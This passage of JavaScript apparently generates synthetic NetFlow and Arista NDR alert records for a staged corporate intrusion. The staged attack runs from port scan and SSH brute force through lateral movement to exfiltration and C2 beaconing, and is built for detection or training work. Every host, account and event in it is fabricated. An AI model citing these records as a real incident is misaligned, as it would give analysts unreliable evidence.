    'Subject TrustSec ID','Subject TrustSec Name',
    'Subject FIN Packets','Subject RST Packets','Subject SYN Packets','Subject SYN/ACK Packets',
    'Appliance',
    'Application','Application (Flow Sensor)','Application (NBAR)',
    'Application (PacketShaper)','Application (Palo Alto Networks)',
    'Byte Rate','Total Bytes','Packet Rate','Total Packets','Total Traffic (bps)',
    'protocol','Service',
    'TCP Connections','TCP Retransmissions','TCP Retransmission Ratio','MPLS Label',
    'RTT Average','RTT Maximum','RTT Minimum',
    'SRT Average','SRT Maximum','SRT Minimum',
    'VLAN ID',
    'Encryption TLS/SSL Version','Encryption Key Exchange',
    'Encryption Authentication Algorithm','Encryption Algorithm and Key Length','Encryption MAC',
    'Peer ASN','Peer ASN Assignment','Peer Byte Ratio',
    'Peer IP Address','Peer Hostname','Peer MAC Address','Peer MAC Vendor',
    'Peer NAT','Peer NAT Hostname','Peer NAT Port',
    'Peer Orientation','Peer Port/Protocol',
    'Peer Host Groups','Peer Location','Peer User',
    'Peer Bytes','Peer Byte Rate','Peer Interfaces',
    'Peer Packets','Peer Packet Rate','Peer Payload',
    'Peer Process Account','Peer Process Name','Peer File Hash',
    'Peer TrustSec Name',
    'Peer FIN Packets','Peer RST Packets','Peer SYN Packets','Peer SYN/ACK Packets'
  ];

  // SI-unit formatter matching real SNA output: "148.17 K", "14.34 M"
  const si = (n) => {
    if (!n || n <= 0) return '0';
    if (n < 1e3) return Number(n).toFixed(2).replace(/\.00$/, '');
    if (n < 1e6) return (n / 1e3).toFixed(2) + ' K';
    if (n < 1e9) return (n / 1e6).toFixed(2) + ' M';
    return (n / 1e9).toFixed(2) + ' G';
  };
  const durStr = (s) => {
    if (s < 60) return `${s}s`;
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
    if (h > 0 && sec > 0) return `${h}hr ${m}min ${sec}s`;
    if (h > 0) return `${h}hr ${m}min`;
    return `${m}min ${sec}s`;
  };
  // Interface string: switch interfaces the flow traversed
  const ifc = (h) => h?.vlan ? `10.10.70.1(ifIndex-${h.vlan}), 10.10.70.1(ifIndex-${h.vlan + 100})` : '';

  // TrustSec SGT tags and host group names per host
  const SGT = {
    'ws-finance-21': { sgt: 10, sgtName: 'Employees-Finance',    groups: 'FIN_WORKSTATIONS, CORP_ENDPOINTS' },
    'ws-finance-22': { sgt: 10, sgtName: 'Employees-Finance',    groups: 'FIN_WORKSTATIONS, CORP_ENDPOINTS' },
    'ws-finance-23': { sgt: 10, sgtName: 'Employees-Finance',    groups: 'FIN_WORKSTATIONS, CORP_ENDPOINTS' },
    'ws-finance-24': { sgt: 10, sgtName: 'Employees-Finance',    groups: 'FIN_WORKSTATIONS, CORP_ENDPOINTS' },
    'ws-finance-25': { sgt: 10, sgtName: 'Employees-Finance',    groups: 'FIN_WORKSTATIONS, CORP_ENDPOINTS' },
    'ws-hr-31':      { sgt: 11, sgtName: 'Employees-HR',         groups: 'HR_WORKSTATIONS, CORP_ENDPOINTS' },
    'ws-hr-32':      { sgt: 11, sgtName: 'Employees-HR',         groups: 'HR_WORKSTATIONS, CORP_ENDPOINTS' },
    'eng-ws-44':     { sgt: 12, sgtName: 'Employees-Engineering',groups: 'ENG_WORKSTATIONS, CORP_ENDPOINTS' },
    'eng-ws-45':     { sgt: 12, sgtName: 'Employees-Engineering',groups: 'ENG_WORKSTATIONS, CORP_ENDPOINTS' },
    'eng-ws-46':     { sgt: 12, sgtName: 'Employees-Engineering',groups: 'ENG_WORKSTATIONS, CORP_ENDPOINTS' },
    'fs-payroll-01': { sgt: 20, sgtName: 'Servers-FileShare',    groups: 'FILE_SERVERS, CORP_SERVERS' },
    'fs-hr-02':      { sgt: 20, sgtName: 'Servers-FileShare',    groups: 'FILE_SERVERS, CORP_SERVERS' },
    'db-finance-03': { sgt: 21, sgtName: 'Servers-Database',     groups: 'DB_SERVERS, CORP_SERVERS' },
    'app-erp-04':    { sgt: 22, sgtName: 'Servers-AppTier',      groups: 'APP_SERVERS, CORP_SERVERS' },
    'app-crm-05':    { sgt: 22, sgtName: 'Servers-AppTier',      groups: 'APP_SERVERS, CORP_SERVERS' },
    'ops-jump-55':   { sgt: 30, sgtName: 'Admin-OPS',            groups: 'OPS_HOSTS, PRIVILEGED_ACCESS' },
    'ops-jump-56':   { sgt: 30, sgtName: 'Admin-OPS',            groups: 'OPS_HOSTS, PRIVILEGED_ACCESS' },
    'lab-host-61':   { sgt: 40, sgtName: 'Lab-Hosts',            groups: 'LAB_HOSTS, DEV_ENDPOINTS' },
    'lab-host-62':   { sgt: 40, sgtName: 'Lab-Hosts',            groups: 'LAB_HOSTS, DEV_ENDPOINTS' },
    'dc-primary-01': { sgt: 50, sgtName: 'Servers-DC',           groups: 'DOMAIN_CONTROLLERS, CRITICAL_SERVERS' },
    'dc-secondary-02':{ sgt: 50, sgtName: 'Servers-DC',          groups: 'DOMAIN_CONTROLLERS, CRITICAL_SERVERS' },
  };
  const APP_LABEL = {
    SMB: 'SMB (unclassified)', SSH: 'SSH (unclassified)', HTTPS: 'HTTPSSSL',
    LDAP: 'LDAPLDAP', LDAPS: 'LDAPLDAP', Kerberos: 'Kerberos (unclassified)',
    MSSQL: 'MS-SQL (unclassified)', MSRPC: 'MSRPC (unclassified)',
    DNS: 'DNS (unclassified)', SNMP: 'SNMP (unclassified)',
    'SMTP-TLS': 'SMTP (unclassified)', Telnet: 'Telnet (unclassified)',
  };
  const SVC_LABEL = {
    SMB: 'smb', SSH: 'ssh', HTTPS: 'https', LDAP: 'ldap', LDAPS: 'ldap',
    Kerberos: 'kerberos', MSSQL: 'mssql', MSRPC: 'msrpc',
    DNS: 'dns', SNMP: 'snmp', 'SMTP-TLS': 'smtp', Telnet: 'telnet',
  };

  const APPLIANCE = 'corp-stealthwatch-01 (10.10.80.50)';
  const DOMAIN = 'CORP';
  let fid = 24200000000;
  const rows = [];

  // Build a 96-column SNA flow row.
  // sn/sh = subject (initiator); pn/ph = peer (responder).
  // Pass sn (internal hostname key) OR sh (custom host object) for external subjects.
  // Pass pn (internal hostname key) OR ph+pe=true for external peers.
  const mkRow = ({
    startTs, endTs, durSecs, action = 'permitted',
    sn, sh: shIn, sm: smIn, su = '',
    sp,
    pn, ph: phIn, pm: pmIn, pe = false,
    pp,
    proto, app,
    sB, sP, dB, dP,
    tls = '', kex = '', ciph = '', tmac = '',
    rttA = '', rttX = '', rttN = '',
    sFIN = 0, sRST = 0, sSYN = 1, sSYNACK = 0,
    pFIN = 0, pRST = 0, pSYN = 0, pSYNACK = 1,
  }) => {
    const sh = shIn || HOSTS[sn] || {};
    const ph = phIn || (pe ? {} : (HOSTS[pn] || {}));
    const sm = smIn || (sn && SGT[sn]) || {};
    const pm = pmIn || (pn && !pe && SGT[pn]) || {};
    const phDisp = pn || ph.hostname || '';
    const totalB = sB + dB, totalP = sP + dP;
    const byteRt = totalB / durSecs, pktRt = totalP / durSecs;
    const sBR = totalB > 0 ? ((sB / totalB) * 100).toFixed(2) : '0';
    const pBR = totalB > 0 ? ((dB / totalB) * 100).toFixed(2) : '0';
    const application = APP_LABEL[app] || `${app} (unclassified)`;
    const service = SVC_LABEL[app] || app.toLowerCase();
    return [
      fid++, DOMAIN, startTs, endTs, durStr(durSecs), action,          // 1-6
      sh.asn || '', sh.asn ? 'CorpNet' : '', sBR,                       // 7-9
      sh.ip || '', sn || '', sh.mac || '', sh.mac ? 'Corp-NIC' : '',    // 10-13
      '', '', '',                                                         // 14-16 NAT
      'Client', `${sp}/${proto}`,                                        // 17-18
      sm.groups || '', sh.country || '', su,                             // 19-21
      si(sB), si(sB / durSecs), ifc(sh),                                // 22-24
      si(sP), (sP / durSecs).toFixed(2), '',                            // 25-27
      '', '', '',                                                         // 28-30 process
      '', '',                                                             // 31-32 parent
      sm.sgt || '', sm.sgtName || '',                                    // 33-34
      sFIN, sRST, sSYN, sSYNACK,                                        // 35-38
      APPLIANCE,                                                          // 39
      application, '', '', '', '',                                        // 40-44
      si(byteRt), si(totalB), pktRt.toFixed(2), si(totalP), si(byteRt * 8), // 45-49
      proto, service,                                                     // 50-51
      proto === 'TCP' ? 1 : 0, 0, '0.00', '',                           // 52-55 TCP stats
      rttA, rttX, rttN,                                                  // 56-58 RTT
      '', '', '',                                                         // 59-61 SRT
      sh.vlan || '',                                                      // 62 VLAN
      tls, kex, '', ciph, tmac,                                          // 63-67 TLS
      ph.asn || '', pe ? (ph.country || '') : (ph.asn ? 'CorpNet' : ''), pBR, // 68-70
      ph.ip || '', phDisp, '', '',                                        // 71-74
      '', '', '',                                                         // 75-77 peer NAT
      'Server', `${pp}/${proto}`,                                        // 78-79
      pe ? 'Outside Hosts' : (pm.groups || ''), ph.country || '', '',   // 80-82
      si(dB), si(dB / durSecs), pe ? '' : ifc(ph),                      // 83-85
      si(dP), (dP / durSecs).toFixed(2), '',                            // 86-88
      '', '', '',                                                         // 89-91 peer process
      pm.sgtName || '',                                                   // 92
      pFIN, pRST, pSYN, pSYNACK,                                        // 93-96
    ];
  };

  // ── Phase 1: Normal morning traffic 06:00–06:18 ──────────────────────────
  const normals = [
    { sn:'ws-finance-21', sp:49152, pn:'fs-payroll-01', pp:445,  proto:'TCP', app:'SMB',
      sB:8192,   sP:6,   dB:65536,   dP:48,  m:0,  d:45 },
    { sn:'ws-finance-22', sp:49153, pn:'fs-payroll-01', pp:445,  proto:'TCP', app:'SMB',
      sB:6144,   sP:5,   dB:49152,   dP:36,  m:1,  d:38 },
    { sn:'ws-finance-23', sp:49154, pn:'db-finance-03', pp:1433, proto:'TCP', app:'MSSQL',
      sB:4096,   sP:4,   dB:32768,   dP:28,  m:2,  d:30 },
    { sn:'ws-hr-31',      sp:49155, pn:'fs-hr-02',      pp:445,  proto:'TCP', app:'SMB',
      sB:5120,   sP:4,   dB:40960,   dP:32,  m:3,  d:35 },
    { sn:'eng-ws-44',     sp:49156, pn:'dc-primary-01', pp:389,  proto:'TCP', app:'LDAP',
      sB:3200,   sP:10,  dB:12800,   dP:40,  m:3,  d:55 },
    { sn:'ws-finance-24', sp:54001, pn:'app-erp-04',    pp:8443, proto:'TCP', app:'HTTPS',
      sB:15360,  sP:12,  dB:245760,  dP:180, m:4,  d:85,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_256_GCM/256', tmac:'SHA384' },
    { sn:'ws-finance-25', sp:54002, pn:'app-crm-05',    pp:443,  proto:'TCP', app:'HTTPS',
      sB:12288,  sP:9,   dB:196608,  dP:144, m:5,  d:70,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_256_GCM/256', tmac:'SHA384' },
    { sn:'ws-hr-32',      sp:54003, pn:'app-crm-05',    pp:443,  proto:'TCP', app:'HTTPS',
      sB:9216,   sP:7,   dB:147456,  dP:108, m:6,  d:58,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_256_GCM/256', tmac:'SHA384' },
    { sn:'eng-ws-45',     sp:54004, pn:'app-erp-04',    pp:8443, proto:'TCP', app:'HTTPS',
      sB:20480,  sP:16,  dB:327680,  dP:240, m:7,  d:110,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_256_GCM/256', tmac:'SHA384' },
    { sn:'lab-host-61',   sp:54005, ph:EXT.github,      pn:EXT.github.hostname, pp:443, pe:true,
      proto:'TCP', app:'HTTPS',
      sB:10240,  sP:8,   dB:163840,  dP:120, m:8,  d:78,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_128_GCM/128', tmac:'SHA256' },
    { sn:'ws-finance-21', sp:54006, ph:EXT.o365,        pn:EXT.o365.hostname,   pp:587, pe:true,
      proto:'TCP', app:'SMTP-TLS',
      sB:8192,   sP:6,   dB:4096,    dP:3,   m:9,  d:48,
      tls:'TLS 1.2', kex:'ECDHE', ciph:'AES_256_CBC/256', tmac:'SHA256' },
    { sn:'ws-finance-22', sp:54007, ph:EXT.o365,        pn:EXT.o365.hostname,   pp:587, pe:true,
      proto:'TCP', app:'SMTP-TLS',
      sB:6144,   sP:5,   dB:3072,    dP:2,   m:10, d:36,
      tls:'TLS 1.2', kex:'ECDHE', ciph:'AES_256_CBC/256', tmac:'SHA256' },
    { sn:'ops-jump-56',   sp:54008, pn:'dc-primary-01', pp:135,  proto:'TCP', app:'MSRPC',
      sB:4096,   sP:3,   dB:8192,    dP:6,   m:11, d:25 },
    { sn:'eng-ws-46',     sp:54009, pn:'app-erp-04',    pp:8443, proto:'TCP', app:'HTTPS',
      sB:18432,  sP:14,  dB:294912,  dP:216, m:12, d:96,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_256_GCM/256', tmac:'SHA384' },
    { sn:'lab-host-62',   sp:54010, pn:'dc-primary-01', pp:88,   proto:'TCP', app:'Kerberos',
      sB:1024,   sP:2,   dB:4096,    dP:8,   m:13, d:12 },
    { sn:'ws-finance-24', sp:54011, ph:EXT.o365,        pn:EXT.o365.hostname,   pp:587, pe:true,
      proto:'TCP', app:'SMTP-TLS',
      sB:6144,   sP:5,   dB:3072,    dP:2,   m:14, d:42,
      tls:'TLS 1.2', kex:'ECDHE', ciph:'AES_256_CBC/256', tmac:'SHA256' },
    { sn:'ws-hr-31',      sp:54012, pn:'dc-primary-01', pp:88,   proto:'TCP', app:'Kerberos',
      sB:1024,   sP:2,   dB:4096,    dP:8,   m:15, d:12 },
    { sn:'ws-finance-23', sp:54013, pn:'app-crm-05',    pp:443,  proto:'TCP', app:'HTTPS',
      sB:13312,  sP:10,  dB:212992,  dP:156, m:16, d:78,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_256_GCM/256', tmac:'SHA384' },
    { sn:'ws-finance-21', sp:49200, pn:'dc-primary-01', pp:88,   proto:'TCP', app:'Kerberos',
      sB:1024,   sP:2,   dB:4096,    dP:8,   m:17, d:12 },
    { sn:'eng-ws-44',     sp:54014, ph:EXT.github,      pn:EXT.github.hostname, pp:443, pe:true,
      proto:'TCP', app:'HTTPS',
      sB:12288,  sP:9,   dB:196608,  dP:144, m:18, d:85,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_128_GCM/128', tmac:'SHA256' },
  ];
  normals.forEach(f => {
    rows.push(row(mkRow({
      startTs: ts(BASE, f.m), endTs: ts(BASE, f.m, f.d), durSecs: f.d,
      sn: f.sn, ph: f.ph, pn: f.pn, pe: f.pe || false,
      sp: f.sp, pp: f.pp,
      proto: f.proto, app: f.app,
      sB: f.sB, sP: f.sP, dB: f.dB, dP: f.dP,
      su: USERS[f.sn] || '',
      tls: f.tls || '', kex: f.kex || '', ciph: f.ciph || '', tmac: f.tmac || '',
    })));
  });

  // ── Phase 2: Port scan 06:20 — subject is external attacker ──────────────
  const scanPorts = [22, 23, 80, 443, 445, 1433, 3389, 8080, 8443, 135, 139, 3306, 5432, 27017];
  const hostKeys = Object.keys(HOSTS);
  scanPorts.forEach((port, i) => {
    const dstKey = hostKeys[i % hostKeys.length];
    rows.push(row(mkRow({
      startTs: ts(BASE, 20, i * 30), endTs: ts(BASE, 20, i * 30 + 2), durSecs: 2,
      sh: EXT.attacker_nl, sn: EXT.attacker_nl.hostname, sm: {}, su: '',
      sp: rand(49400, 62000),
      pn: dstKey, pp: port, pe: false,
      proto: 'TCP',
      app: port === 443 || port === 8443 ? 'HTTPS' : port === 22 ? 'SSH' : port === 445 ? 'SMB' : 'MSRPC',
      sB: rand(40, 200), sP: rand(1, 4), dB: rand(0, 80), dP: rand(0, 2),
      sFIN: 0, sRST: 0, sSYN: 1, sSYNACK: 0,
      pFIN: 0, pRST: 0, pSYN: 0, pSYNACK: 0,
    })));
  });

  // ── Phase 3: SSH brute force 06:32 ───────────────────────────────────────
  for (let i = 0; i < 8; i++) {
    rows.push(row(mkRow({
      startTs: ts(BASE, 32, i * 60), endTs: ts(BASE, 32, i * 60 + 4), durSecs: 4,
      sh: EXT.attacker_nl, sn: EXT.attacker_nl.hostname, sm: {}, su: '',
      sp: rand(52000, 62000),
      pn: 'ops-jump-55', pp: 22, pe: false,
      proto: 'TCP', app: 'SSH',
      sB: 1408, sP: 6, dB: 512, dP: 2,
      sFIN: 0, sRST: i < 7 ? 1 : 0, sSYN: 1, sSYNACK: 0,
      pFIN: 0, pRST: 0, pSYN: 0, pSYNACK: 1,
    })));
  }

  // ── Phase 4: Successful external SSH session 06:40–07:08 ─────────────────
  rows.push(row(mkRow({
    startTs: ts(BASE, 40), endTs: ts(BASE, 68), durSecs: 1680,
    sh: EXT.attacker_nl, sn: EXT.attacker_nl.hostname, sm: {}, su: '',
    sp: 53422,
    pn: 'ops-jump-55', pp: 22, pe: false,
    proto: 'TCP', app: 'SSH',
    sB: 2097152, sP: 1280, dB: 2097152, dP: 1280,
    tls: '', kex: '', ciph: '', tmac: '',
    rttA: '28ms', rttX: '45ms', rttN: '12ms',
  })));

  // ── Phase 5: Lateral movement 07:45–08:57 ────────────────────────────────
  const lateral = [
    { sn:'ops-jump-55', sp:52100, pn:'dc-primary-01',  pp:445,  proto:'TCP', app:'SMB',
      sB:24576,   sP:32,  dB:196608,  dP:256,  m:45,  d:120 },
    { sn:'ops-jump-55', sp:52101, pn:'dc-primary-01',  pp:88,   proto:'TCP', app:'Kerberos',
      sB:8192,    sP:14,  dB:32768,   dP:56,   m:47,  d:30 },
    { sn:'ops-jump-55', sp:52102, pn:'dc-primary-01',  pp:389,  proto:'TCP', app:'LDAP',
      sB:51200,   sP:68,  dB:409600,  dP:544,  m:50,  d:300 },
    { sn:'ops-jump-55', sp:52103, pn:'fs-payroll-01',  pp:445,  proto:'TCP', app:'SMB',
      sB:102400,  sP:128, dB:819200,  dP:1024, m:55,  d:420 },
    { sn:'ops-jump-55', sp:52104, pn:'db-finance-03',  pp:1433, proto:'TCP', app:'MSSQL',
      sB:35840,   sP:44,  dB:286720,  dP:352,  m:62,  d:180 },
    { sn:'ops-jump-55', sp:52107, pn:'lab-host-61',    pp:22,   proto:'TCP', app:'SSH',
      sB:8192,    sP:12,  dB:4096,    dP:6,    m:68,  d:90 },
    { sn:'ops-jump-55', sp:52105, pn:'dc-primary-01',  pp:135,  proto:'TCP', app:'MSRPC',
      sB:16384,   sP:22,  dB:131072,  dP:176,  m:75,  d:60 },
    { sn:'ops-jump-55', sp:52106, pn:'dc-secondary-02',pp:389,  proto:'TCP', app:'LDAP',
      sB:204800,  sP:256, dB:1638400, dP:2048, m:77,  d:240 },
    { sn:'ws-finance-21',sp:54100,pn:'dc-primary-01',  pp:135,  proto:'TCP', app:'MSRPC',
      sB:16384,   sP:22,  dB:131072,  dP:176,  m:80,  d:60 },
    { sn:'ws-finance-21',sp:54101,pn:'db-finance-03',  pp:1433, proto:'TCP', app:'MSSQL',
      sB:4096,    sP:6,   dB:32768,   dP:48,   m:88,  d:30 },
    { sn:'ops-jump-55', sp:52108, pn:'fs-payroll-01',  pp:445,  proto:'TCP', app:'SMB',
      sB:2097152, sP:2560,dB:16777216,dP:20480,m:96,  d:900 },
  ];
  lateral.forEach(f => {
    rows.push(row(mkRow({
      startTs: ts(BASE, f.m), endTs: ts(BASE, f.m, f.d), durSecs: f.d,
      sn: f.sn, sp: f.sp, pn: f.pn, pp: f.pp, pe: false,
      proto: f.proto, app: f.app,
      sB: f.sB, sP: f.sP, dB: f.dB, dP: f.dP,
      su: USERS[f.sn] || '',
    })));
  });

  // ── Phase 6: Data exfiltration 08:40–10:32 ───────────────────────────────
  const exfil = [
    { sB:1048576, sP:1280, dB:65536, dP:80,  m:100, d:120 },
    { sB:2097152, sP:2560, dB:131072,dP:160, m:105, d:240 },
    { sB:4194304, sP:5120, dB:262144,dP:320, m:112, d:480 },
  ];
  exfil.forEach(e => {
    rows.push(row(mkRow({
      startTs: ts(BASE, e.m), endTs: ts(BASE, e.m, e.d), durSecs: e.d,
      sn: 'ws-finance-21', sp: rand(54200, 65000),
      ph: EXT.exfil_target, pn: EXT.exfil_target.hostname, pp: 443, pe: true,
      proto: 'TCP', app: 'HTTPS',
      sB: e.sB, sP: e.sP, dB: e.dB, dP: e.dP,
      su: USERS['ws-finance-21'],
      tls: 'TLS 1.3', kex: 'ECDHE', ciph: 'AES_256_GCM/256', tmac: 'SHA384',
    })));
  });

  // ── Phase 7: C2 beaconing 09:10–10:15 (every 5 min) ─────────────────────
  for (let i = 0; i < 14; i++) {
    const bBytes = rand(512, 2048);
    rows.push(row(mkRow({
      startTs: ts(BASE, 130 + i * 5, rand(0, 30)),
      endTs:   ts(BASE, 130 + i * 5, rand(31, 60)),
      durSecs: rand(20, 50),
      sn: 'ws-finance-21', sp: rand(54300, 65000),
      ph: EXT.c2_server, pn: EXT.c2_server.hostname, pp: 443, pe: true,
      proto: 'TCP', app: 'HTTPS',
      sB: bBytes, sP: rand(3, 8), dB: rand(256, 1024), dP: rand(2, 5),
      su: USERS['ws-finance-21'],
      tls: 'TLS 1.2', kex: 'RSA', ciph: 'AES_128_CBC/128', tmac: 'SHA1',
    })));
  }

  // ── Background noise flows ────────────────────────────────────────────────
  const bg = [
    { sn:'ws-finance-22', sp:49400, pn:'fs-payroll-01', pp:445,  proto:'TCP', app:'SMB',
      sB:5632,  sP:8,  dB:45056,  dP:64,  m:35, d:10 },
    { sn:'ws-hr-32',      sp:49401, pn:'fs-hr-02',      pp:445,  proto:'TCP', app:'SMB',
      sB:4096,  sP:6,  dB:32768,  dP:48,  m:37, d:8 },
    { sn:'eng-ws-46',     sp:54200, pn:'app-erp-04',    pp:8443, proto:'TCP', app:'HTTPS',
      sB:16384, sP:22, dB:262144, dP:352, m:39, d:25,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_256_GCM/256', tmac:'SHA384' },
    { sn:'ws-finance-25', sp:49502, pn:'db-finance-03', pp:1433, proto:'TCP', app:'MSSQL',
      sB:8192,  sP:16, dB:65536,  dP:128, m:40, d:20 },
    { sn:'ops-jump-56',   sp:52200, pn:'dc-primary-01', pp:636,  proto:'TCP', app:'LDAPS',
      sB:3072,  sP:8,  dB:12288,  dP:32,  m:42, d:12,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_128_GCM/128', tmac:'SHA256' },
    { sn:'ws-hr-31',      sp:54203, pn:'app-crm-05',    pp:443,  proto:'TCP', app:'HTTPS',
      sB:12288, sP:18, dB:196608, dP:288, m:44, d:20,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_256_GCM/256', tmac:'SHA384' },
    { sn:'lab-host-61',   sp:54201, ph:EXT.github,      pn:EXT.github.hostname, pp:443, pe:true,
      proto:'TCP', app:'HTTPS',
      sB:10240, sP:14, dB:163840, dP:224, m:60, d:22,
      tls:'TLS 1.3', kex:'ECDHE', ciph:'AES_128_GCM/128', tmac:'SHA256' },
    { sn:'ws-finance-23', sp:54202, ph:EXT.o365,        pn:EXT.o365.hostname,   pp:587, pe:true,
      proto:'TCP', app:'SMTP-TLS',
      sB:7168,  sP:10, dB:3584,   dP:5,   m:62, d:14,
      tls:'TLS 1.2', kex:'ECDHE', ciph:'AES_256_CBC/256', tmac:'SHA256' },
  ];
  bg.forEach(f => {
    rows.push(row(mkRow({
      startTs: ts(BASE, f.m), endTs: ts(BASE, f.m, f.d), durSecs: f.d,
      sn: f.sn, ph: f.ph, pn: f.pn, pe: f.pe || false,
      sp: f.sp, pp: f.pp,
      proto: f.proto, app: f.app,
      sB: f.sB, sP: f.sP, dB: f.dB, dP: f.dP,
      su: USERS[f.sn] || '',
      tls: f.tls || '', kex: f.kex || '', ciph: f.ciph || '', tmac: f.tmac || '',
    })));
  });

  return [headers.join(','), ...rows].join('\n');
}

// ── Arista NDR ─────────────────────────────────────────────────────────────────
function generateArista() {
  const headers = [
    'alert_id','flow_id','alert_name','alert_type','severity','confidence','risk_score',
    'start_time','end_time',
    'src_ip','src_port','src_mac','src_hostname','src_country',
    'dst_ip','dst_port','dst_mac','dst_hostname','dst_country',
    'protocol','application','packets','bytes',
    'dns_query','dns_response','http_method','http_host','http_uri','http_status','http_user_agent',
    'tls_version','cipher_suite','ja3','ja3s','sni',
    'filename','md5','sha256','ioc_match','malware_family',
    'c2_activity','beaconing','lateral_movement','data_exfiltration','port_scanning',
    'user_name','authentication_result',
    'anomaly_score','geo_latitude','geo_longitude','mitre_technique','raw_metadata'
  ];

  const rows = [];
  let arId = 3000;
  const push = (fields) => { rows.push(row([`AR-${arId++}`, ...fields])); };

  // Recon alerts
  const scanAlerts = [
    { sflow: 'SN-2020', name: 'Port Scan Detected',          type: 'Reconnaissance', sev: 'high',   conf: 91, score: 78, dst: 'ops-jump-55',   dport: 22,  proto: 'TCP', app: 'SSH',    pkts: 6,  bytes: 360,  mins: 20,   ua: 'Nmap/7.93',           mitre: 'T1046' },
    { sflow: 'SN-2021', name: 'Port Scan Detected',          type: 'Reconnaissance', sev: 'high',   conf: 88, score: 75, dst: 'ops-jump-55',   dport: 3389,proto: 'TCP', app: 'RDP',    pkts: 4,  bytes: 240,  mins: 20.5, ua: 'Nmap/7.93',           mitre: 'T1046' },
    { sflow: 'SN-2022', name: 'Port Scan Detected',          type: 'Reconnaissance', sev: 'medium', conf: 82, score: 68, dst: 'fw-edge-01',    dport: 443, proto: 'TCP', app: 'HTTPS',  pkts: 3,  bytes: 180,  mins: 21,   ua: 'Nmap/7.93',           mitre: 'T1046' },
    { sflow: 'SN-2023', name: 'SMB Probe',                   type: 'Reconnaissance', sev: 'high',   conf: 87, score: 80, dst: 'fs-payroll-01', dport: 445, proto: 'TCP', app: 'SMB',    pkts: 4,  bytes: 240,  mins: 21.5, ua: '',                    mitre: 'T1046' },
    { sflow: 'SN-2024', name: 'LDAP Enumeration',            type: 'Reconnaissance', sev: 'high',   conf: 89, score: 82, dst: 'dc-primary-01', dport: 389, proto: 'TCP', app: 'LDAP',   pkts: 5,  bytes: 320,  mins: 22,   ua: 'ldapsearch/2.5',     mitre: 'T1087.002' },
    { sflow: 'SN-2025', name: 'RDP Brute Force Attempt',     type: 'Reconnaissance', sev: 'medium', conf: 76, score: 65, dst: 'ops-jump-56',   dport: 3389,proto: 'TCP', app: 'RDP',    pkts: 8,  bytes: 480,  mins: 22.5, ua: '',                    mitre: 'T1110.001' },
    { sflow: 'SN-2026', name: 'SSH Service Enumeration',     type: 'Reconnaissance', sev: 'medium', conf: 79, score: 67, dst: 'ops-jump-56',   dport: 22,  proto: 'TCP', app: 'SSH',    pkts: 5,  bytes: 300,  mins: 23,   ua: 'libssh/0.10.4',      mitre: 'T1046' },
    { sflow: 'SN-2027', name: 'MSSQL Service Detected',      type: 'Reconnaissance', sev: 'high',   conf: 85, score: 74, dst: 'db-finance-03', dport: 1433,proto: 'TCP', app: 'MSSQL',  pkts: 3,  bytes: 180,  mins: 23.5, ua: '',                    mitre: 'T1046' },
  ];
  scanAlerts.forEach(a => {
    const dh = HOSTS[a.dst];
    push([a.sflow, a.name, a.type, a.sev, a.conf, a.score,
      ts(BASE, a.mins), ts(BASE, a.mins, 10),
      EXT.attacker_nl.ip, rand(49400, 62000), EXT.attacker_nl.mac, EXT.attacker_nl.hostname, EXT.attacker_nl.country,
      dh.ip, a.dport, dh.mac, a.dst, dh.country,
      a.proto, a.app, a.pkts, a.bytes,
      '', '', '', '', '', '', a.ua,
      '', '', '', '', '',
      '', '', '', 'no', '',
      'no', 'no', 'no', 'no', 'yes',
      '', 'failed',
      a.score - rand(2, 8), EXT.attacker_nl.lat, EXT.attacker_nl.lon, a.mitre,
      `Arista NDR: ${a.name} ${EXT.attacker_nl.ip}->${a.dst}:${a.dport} [${a.type}]`
    ]);
  });

  // Brute force alerts
  for (let i = 0; i < 8; i++) {
    const dh = HOSTS['ops-jump-55'];
    push([`SN-20${30+i}`, 'SSH Brute Force Authentication', 'Credential_Access', 'high', 94, 78 + i,
      ts(BASE, 32, i * 60), ts(BASE, 32, i * 60 + 4),
      EXT.attacker_nl.ip, rand(52000, 62000), EXT.attacker_nl.mac, EXT.attacker_nl.hostname, EXT.attacker_nl.country,
      dh.ip, 22, dh.mac, 'ops-jump-55', dh.country,
      'TCP', 'SSH', 6, 1408,
      '', '', '', '', '', '', 'libssh/0.10.4',
      '', '', '', '', '',
      '', '', '', 'no', '',
      'no', 'no', 'no', 'no', 'no',
      'admin', 'failed',
      70 + i, EXT.attacker_nl.lat, EXT.attacker_nl.lon, 'T1110.001',
      `Arista NDR: SSH Brute Force ${EXT.attacker_nl.ip}->ops-jump-55 attempt ${i+1}/8`
    ]);
  }

  // External SSH compromise
  {
    const dh = HOSTS['ops-jump-55'];
    push(['SN-2040', 'External SSH Login - Credential Compromise', 'Initial_Access', 'critical', 98, 92,
      ts(BASE, 40), ts(BASE, 68),
      EXT.attacker_nl.ip, 53422, EXT.attacker_nl.mac, EXT.attacker_nl.hostname, EXT.attacker_nl.country,
      dh.ip, 22, dh.mac, 'ops-jump-55', dh.country,
      'TCP', 'SSH', 1280, 4194304,
      '', '', '', '', '', '', 'OpenSSH_8.9p1',
      '', '', '', '', '',
      '', '', '', 'no', '',
      'no', 'no', 'no', 'no', 'no',
      'svc-ops@corp.local', 'success',
      92, EXT.attacker_nl.lat, EXT.attacker_nl.lon, 'T1078',
      `CRITICAL: External SSH session from ${EXT.attacker_nl.ip}->ops-jump-55 [4MB transferred] [MITRE T1078 Valid Accounts]`
    ]);
  }

  // Lateral movement alerts
  const lateralAlerts = [
    { flow:'SN-2041', name:'Lateral Movement - SMB Admin Share', type:'Lateral_Movement', sev:'high', conf:92, score:83, src:'ops-jump-55', dst:'dc-primary-01', dport:445, proto:'TCP', app:'SMB', pkts:32, bytes:24576, mins:45, mitre:'T1021.002', c2:'no', beacon:'no', lat:'yes', exfil:'no', scan:'no' },
